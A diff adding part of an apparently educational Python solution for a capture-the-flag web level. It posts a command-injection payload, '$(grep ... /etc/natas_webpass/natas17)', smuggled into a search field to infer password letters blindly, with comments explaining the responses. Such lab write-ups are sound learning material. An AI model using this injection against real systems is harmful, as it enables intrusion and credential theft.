@@ -44,3 +44,14 @@ response = session.post(URL, data=data)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
 # as we can see, nothing is returned as a result of our search, which means b is a letter in the password
+# III. case 2: if the letter is not in the password,
+# the word 'Africans' will be returned as the result of our search, 
+# which means that the letter is not in the password as nothing is concatenated with the word 'Africans'
+data = {
+    'needle' : 'Africans$(grep a /etc/natas_webpass/natas17)',
+    'submit' : 'submit'
+}
+response = session.post(URL, data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+# as we can see, the letter 'a' is not in the password as the password is not concatenated with the search result
